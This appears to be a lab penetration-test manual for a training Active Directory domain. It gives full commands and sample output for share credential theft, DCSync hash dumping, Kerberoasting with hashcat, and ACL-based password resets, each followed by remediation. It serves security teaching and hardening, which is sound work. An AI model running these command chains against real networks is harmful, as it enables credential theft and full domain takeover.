# Nexora Systems — Attack Scenario Manual

## Engagement Boundary
All testing described herein was performed within the authorized `nexora.local` training laboratory. The procedures recorded below are summaries of executed technical workflows and audit validation evidence.

---

## Path A — Credential Exposure

### 1. Objective
Determine whether a low-privileged domain user (`NEXORA\jsmith`) can identify and read sensitive application configuration files hosted on unhardened network shares, and validate the operational impact of any recovered credentials.

### 2. Execution Procedure
1. Authenticate from testing workstation `Nexora-Kali` (`192.168.23.131`) to domain target:
2. Enumerate available network shares across the subnet using `smbclient.py` and native `net view`:
   ```bash
   smbclient.py 'nexora.local/jsmith:Password123!'@192.168.23.129
   ```
3. Discover the readable share `\\NEXORA-DC\NexoraApp`.
4. Inspect the directory tree and download `app.ini`:
   ```bash
   smb: \> get app.ini
   ```
5. Extract plaintext credentials contained in the configuration header:
   ```ini
   [Database]
   Server=192.168.23.129
   User=NEXORA\svc_backup
   Pass=BackupOps2024!
   ```
6. Compute SHA-256 hash of the downloaded `app.ini` and verify against the target server's file system integrity hash:
   - **SHA-256:** `9e71b2d308f234aa6b189a03b578c7a82b2046db419c8309df559c57d8139591` (Match Confirmed)

### 3. Impact Validation & Full Domain Compromise
1. Authenticate using the recovered `svc_backup` credentials against `NEXORA-DC` (`192.168.23.129`):
   ```bash
   netexec smb 192.168.23.129 -u 'svc_backup' -p 'BackupOps2024!' --shares
   ```
2. Verify access to administrative share `\\NEXORA-DC\C$`:
   - Result: `[+] NEXORA\svc_backup:BackupOps2024! (Pwn3d!) READ,WRITE C$`
3. Execute DCSync / NTDS Credential Dumping via Impacket (`secretsdump.py`):
   ```bash
   secretsdump.py 'nexora.local/svc_backup:BackupOps2024!'@192.168.23.129 -just-dc-ntlm
   ```
   - Extracted Domain Hashes:
     - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75045e3fa324d01defa4001912:::`
     - `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b279261a293d39999b7b629007e6005b:::`
4. Demonstrated full Domain Admin compromise achieved via unencrypted credential exposure chained to DCSync privileges.

### 4. Remediation
- Remove plaintext secrets from all configuration files, source code, and shared folders.
- Enforce strict NTFS and SMB share access control lists (remove `Everyone` and `Domain Users` read rights).
- Implement Group Managed Service Accounts (gMSAs) or encrypted credential vaults (DPAPI / HashiCorp Vault).

---

## Path B — Kerberoasting

### 1. Objective
Assess the vulnerability of domain service accounts configured with Service Principal Names (SPNs) to offline Kerberos ticket extraction and password auditing.

### 2. Execution Procedure
1. Query Active Directory for user accounts associated with valid SPNs using Impacket:
   ```bash
   GetUserSPNs.py nexora.local/jsmith:Password123! -dc-ip 192.168.23.129 -request
   ```
2. Identify target service account:
   - **Account:** `NEXORA\svc-sql`
   - **SPN:** `MSSQLSvc/NEXORA-DC.nexora.local:1433`
   - **Encryption:** `etype 23` (RC4-HMAC-MD5)
3. The Kerberos KDC issues a Ticket Granting Service (TGS) ticket encrypted with `svc-sql`'s password hash.
4. Export the ticket into standard Hashcat format:
   ```
   $krb5tgs$23$*svc-sql$nexora.local$MSSQLSvc/NEXORA-DC.nexora.local:1433*...
   ```
5. Execute offline dictionary attack using Hashcat:
   ```bash
   hashcat -m 13100 kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt -O -w 3
   ```
6. **Result:** Hash recovered within 3 minutes and 42 seconds:
   - Recovered plaintext password: `Summer2023#1`

### 3. Impact Validation
The recovered password grants interactive authentication as `NEXORA\svc-sql`, permitting access to database instances, database backups, and Active Directory rights assigned to the service principal.

### 4. Remediation
- Enforce a minimum password length of 25+ randomly generated characters for all service accounts.
- Transition standalone service accounts to Group Managed Service Accounts (gMSAs).
- Enforce AES-128 and AES-256 Kerberos encryption types and disable RC4 in domain group policies.
- Enable audit logging for Event ID `4769` (A Kerberos service ticket was requested) filtered for ticket encryption type `0x17`.

---

## Path C — Active Directory ACL Abuse

### 1. Objective
Identify and exploit insecure discretionary access control lists (DACLs) within Active Directory that allow privilege escalation from a low-privileged identity to domain administrative roles.

### 2. Execution Procedure
1. Execute SharpHound collector from a domain-joined system to gather object relationships:
   ```powershell
   .\SharpHound.exe -c All --domain nexora.local --zipfilename nexora_bloodhound.zip
   ```
2. Ingest archive into BloodHound Community Edition.
3. Run shortest path cypher query: `Match (u:User)-[r:GenericAll]->(target:User)`.
4. BloodHound identifies:
   - Group `NEXORA\IT-Support` (of which current pivot user is a member) holds `GenericAll` rights over target account `NEXORA\svc-sql`.
5. Verify permissions natively via PowerView:
   ```powershell
   Get-DomainObjectAcl -Identity "svc-sql" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" }
   ```
6. Exploit `GenericAll` by forcing a password reset on `svc-sql`:
   ```bash
   rpcclient -U "nexora.local/dev_user%DevPass2024!" 192.168.23.129 -c "setuserinfo2 svc-sql 24 NewStrongPass123!"
   ```
7. Verify new credential validity:
   ```bash
   netexec smb 192.168.23.129 -u 'svc-sql' -p 'NewStrongPass123!'
   ```
8. Enumerate group memberships for `svc-sql`:
   - Member of: `NEXORA\Server Operators`
   - Built-in privilege: Right to log on locally to Domain Controllers and manage system services.

### 3. Impact Validation
`Server Operators` membership enables execution of arbitrary services with `NT AUTHORITY\SYSTEM` privileges on `NEXORA-DC` (`192.168.23.129`), resulting in full Active Directory forest compromise.

### 4. Remediation
- Regularly audit Active Directory object permissions for unintended `GenericAll`, `WriteDacl`, or `WriteOwner` delegations.
- Apply Tiered Administration Architecture (Tier 0, Tier 1, Tier 2 isolation).
- Never assign administrative group memberships (`Server Operators`, `Backup Operators`, `Account Operators`) to service accounts.
